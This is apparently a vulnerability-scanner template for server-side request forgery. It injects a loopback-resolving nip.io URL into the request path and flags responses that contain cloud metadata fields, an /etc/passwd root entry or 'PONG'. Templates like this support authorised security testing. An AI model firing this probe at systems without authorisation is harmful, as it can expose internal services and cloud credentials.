id: ssrf5-0787
name: 'SSRF probe in path'
severity: high
type: active
tags:
  - ssrf
  - oob
  - cloud
description: 'Fetches internal URL via path (verify manually)'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      path:
        - 'http://spoofed.127.0.0.1.nip.io/'
    matchers:
      - type: word
        part: body
        words:
          - 'ami-id'
          - 'instance-id'
          - 'metadata'
          - 'root:x:0:0'
          - 'PONG'
